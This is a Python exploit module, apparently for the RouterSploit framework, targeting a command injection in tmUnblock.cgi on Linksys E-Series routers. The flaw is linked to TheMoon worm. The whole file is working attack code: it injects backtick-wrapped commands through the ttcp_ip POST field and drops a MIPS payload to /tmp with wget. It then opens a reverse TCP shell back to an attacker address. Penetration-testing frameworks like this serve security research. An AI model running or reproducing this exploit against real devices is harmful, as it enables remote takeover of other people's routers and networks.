#!/usr/bin/python2.7
from routersploit import (
    exploits,
    sanitize_url,
    print_error,
    print_status,
    print_success,
    mute,
    validators,
    http_request,
    shell
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation of the Linksys  E-Series OS Command Execution vulneralbility found within tmUnlock.cgi. If the target is vulnerable,
    a payload is dropped onto the device via wget, and executed for calllback
    """
    __info__ = {
        'name': 'Linksys E-Series RCE',
        'description': 'Module exploits Linksys E-Series devices, which, unknown vulnerable firmware versions, have tmUnblock.cgi on the device.',
        'authors': [
            'Johannes Ullrich',  # vuln discovery
            'Rew',  # from exploitdb!
            'Austin <http://github.com/realoriginal>',  # routersploit module
        ],
        'references': [
            'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/linksys_themoon_exec.rb',
            'https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630',
            'https://www.exploit-db.com/exploits/31683/',
            'https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633',
        ],
        'devices': [
            'Linksys E4200',
            'Linksys E3200',
            'Linksys E3000',
            'Linksys E2500',
            'Linksys E2100L',
            'Linksys E2000',
            'Linksys E1550',
            'Linksys E1200',
            'Linksys E1000',
            'Linksys E900',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.0.1', validators=validators.url)
    port = exploits.Option(80, 'Target port', validators=validators.integer)

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("This is Blind command injection. Type reverse_tcp <reverse ip> <port> to start a shell")
            shell(self, architecture="mipsle", method="wget", binary="wget", location="/tmp")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        url = sanitize_url("{}:{}/tmUnblock.cgi".format(self.target, self.port))
        exploit = "-h `{}`".format(cmd)
        data = {'submit_button': '',
                'change_action': '',
                'action': '',
                'commit': '0',
                'ttcp_num': '2',
                'ttcp_size': '2',
                'ttcp_ip': exploit,
                'StartEPI': '1'}
        response = http_request(method="POST", url=url, data=data)
        return response

    @mute
    def check(self):
        cmd = "ls -alt"
        response = self.execute(cmd)
        if response.status_code == 200:
            return True
        else:
            return False

